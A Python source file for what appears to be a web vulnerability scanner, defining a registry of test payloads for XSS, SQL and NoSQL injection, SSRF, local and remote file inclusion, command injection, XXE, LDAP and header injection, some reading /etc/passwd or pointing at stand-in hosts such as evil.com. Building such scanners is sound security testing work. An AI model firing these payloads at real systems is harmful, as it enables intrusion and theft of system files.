from __future__ import annotations

from dataclasses import dataclass, field


def render_payload(template: str, marker: str) -> str:
    return str(template).replace("{marker}", marker)


def payload(path: str) -> list[str]:
    items: list[str] = []
    with open(path, "r", encoding="utf-8") as fp:
        for raw in fp:
            line = raw.strip()
            if not line:
                continue
            if line.startswith("#") or line.startswith("//"):
                continue
            items.append(line)
    return items


@dataclass
class PayloadRegistry:
    payloads: dict[str, list[str]] = field(default_factory=dict)

    @classmethod
    def default(cls) -> "PayloadRegistry":
        return cls(
            payloads={
                "xss": [
                    "{marker}",
                    "\">{marker}",
                    "<w2x data-marker=\"{marker}\"></w2x>",
                    "\"><w2x data-marker=\"{marker}\"></w2x>",
                    "<input value=\"{marker}\">",
                ],
                "sqli": [
                    "'",
                    "\"",
                    "' OR '1'='1' -- ",
                    "\" OR \"1\"=\"1\" -- ",
                    "') OR ('1'='1' -- ",
                    "')) OR 1=1 -- ",
                    "' UNION SELECT NULL -- ",
                ],
                "open_redirect": [
                    "https://example.com/{marker}",
                    "//example.com/{marker}",
                    "///example.com/{marker}",
                    "https:%2f%2fexample.com%2f{marker}",
                    r"/\example.com/{marker}",
                    "https://example.com%2f{marker}",
                    "//example.com//{marker}",
                    "https://example.com?redirect={marker}",
                    "//{marker}@example.com",
                    "https://example.com#{marker}",
                ],
                "ssrf": [
                    "http://127.0.0.1",
                    "http://localhost",
                    "http://[::1]",
                    "http://0.0.0.0",
                    "http://0177.0.0.1",
                    "http://2130706433",
                    "http://017700000001",
                    "http://0x7f.0.0.1",
                    "http://127.1",
                    "http://127.0.1",
                    "file:///etc/passwd",
                    "dict://127.0.0.1:6379",
                    "gopher://127.0.0.1:9000",
                    "ftp://anonymous:anonymous@127.0.0.1",
                ],
                "lfi": [
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "..%2f..%2f..%2fetc/passwd",
                    "..%252f..%252f..%252fetc/passwd",
                    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "%252e%252e/%252e%252e/%252e%252e/etc/passwd",
                    "..%c0%af..%c0%af..%c0%afetc/passwd",
                    "..%5c..%5c..%5cwindows/win.ini",
                    "/etc/passwd%00",
                    "../../../etc/passwd%00.html",
                    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
                    "php://input",
                    "data://text/plain,<?php phpinfo(); ?>",
                    "expect://id",
                ],
                "rfi": [
                    "https://evil.com/shell.txt",
                    "http://evil.com/shell.txt",
                    "//evil.com/shell.txt",
                    "https://attacker.com/malicious.php",
                    "http://{marker}.evil.com/shell.txt",
                ],
                "command_injection": [
                    ";id",
                    ";whoami",
                    ";cat /etc/passwd",
                    "|id",
                    "|whoami",
                    "`id`",
                    "$(id)",
                    ";echo {marker}",
                    "&& echo {marker}",
                    "|| echo {marker}",
                    "| echo {marker}",
                    "`echo {marker}`",
                    "$(echo {marker})",
                    "\nid\n",
                    "%3Bid",
                    "%26%26whoami",
                    "%7Cid",
                    "; sleep 5",
                    "| sleep 5",
                    "`sleep 5`",
                ],
                "nosql": [
                    "{'$gt': ''}",
                    "{'$ne': ''}",
                    "{'$gt': null}",
                    "{'$where': '1==1'}",
                    "{$gt: ''}",
                    "{$ne: ''}",
                    "[$ne]=1",
                    "[$gt]=",
                    "[$regex]=.*",
                    "'; return true; var dummy='",
                    "1'; return true; var dummy='",
                    "true, $where: '1 == 1'",
                    "', $or: [ {}, { 'a': 'a' } ], $comment: 'successful'",
                ],
                "xxe": [
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{marker}.evil.com"> ]><foo>&xxe;</foo>',
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe PUBLIC "X" "file:///etc/passwd"> ]><foo>&xxe;</foo>',
                ],
                "xpath": [
                    "' or '1'='1",
                    "' or '1'='1' --",
                    "' or ''='",
                    '" or "1"="1',
                    "' and '1'='1",
                    "1' and 1=1 --",
                    "1' and 1=2 --",
                    "{marker}' or 1=1",
                ],
                "traversal": [
                    "../",
                    "..\\",
                    "..%2f",
                    "..%5c",
                    "..%255c",
                    "%2e%2e%2f",
                    "%252e%252e%252f",
                    ".../",
                    "....//",
                    "%c0%ae%c0%ae/",
                    "%c1%9c",
                    "....\\....\\....\\",
                    "%2e%2e%2e%2e/",
                    "%00../",
                    "..%00/",
                ],
                "header_injection": [
                    "value\r\nX-Injected: {marker}",
                    "value\nX-Injected: {marker}",
                    "value\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK",
                    "value%0d%0aX-Injected: {marker}",
                    "value%0aX-Injected: {marker}",
                    "value\r\nSet-Cookie: session=hijacked",
                ],
                "ldap": [
                    "*)(uid=*)",
                    "*)(uid=*))(&(uid=*",
                    "*))(|(*",
                    "*))((&*",
                    "*)(cn=*)",
                    "admin*)",
                    "*)(|(objectClass=*)",
                    "*)(|(uid=*)",
                    "admin))(&(uid=*)(userPassword={*}) ) )",
                ],
            }
        )

    def add(self, vuln_type: str, payloads: list[str]) -> None:
        key = vuln_type.strip().lower()
        if not key:
            raise ValueError("vuln_type cannot be empty")
        self.payloads.setdefault(key, [])
        self.payloads[key].extend([p for p in payloads if p is not None and str(p).strip()])

    def add_from_file(self, path: str, default_vuln_type: str = "xss") -> None:
        parsed: dict[str, list[str]] = {}
        with open(path, "r", encoding="utf-8") as fp:
            for raw in fp:
                line = raw.strip()
                if not line:
                    continue
                if line.startswith("#") or line.startswith("//"):
                    continue

                if ":" in line:
                    t, p = line.split(":", 1)
                    t = t.strip().lower()
                    p = p.strip()
                    if t and p:
                        parsed.setdefault(t, []).append(p)
                    continue

                parsed.setdefault(default_vuln_type.strip().lower(), []).append(line)

        for t, items in parsed.items():
            self.add(t, items)

    def get(self, vuln_type: str) -> list[str]:
        return list(self.payloads.get(vuln_type.strip().lower(), []))

    def rendered(self, vuln_type: str, marker: str) -> list[str]:
        return [render_payload(p, marker) for p in self.get(vuln_type)]
